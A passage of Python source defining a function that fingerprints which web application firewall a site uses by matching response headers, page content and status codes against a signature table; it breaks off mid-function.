def detect_waf(headers, status_code, content):
    """Detect which WAF is in use based on response."""
    detected_wafs = []
    headers_lower = {k.lower(): v for k, v in headers.items()}

    for waf_name, sigs in WAF_SIGNATURES.items():
        # Header-based detection
        if any(h.lower() in headers_lower for h in sigs.get("headers", [])):
            detected_wafs.append(waf_name)
            continue
        # Content-based detection
        if any(s.lower() in (content or '').lower() for s in sigs.get("content", [])):
            detected_wafs.append(waf_name)
            continue
        # Status code + generic header detection
        if status_code in sigs.get("status_codes", []):
            generic_headers = ["server", "x-powered-by", "via", "x-cache"]
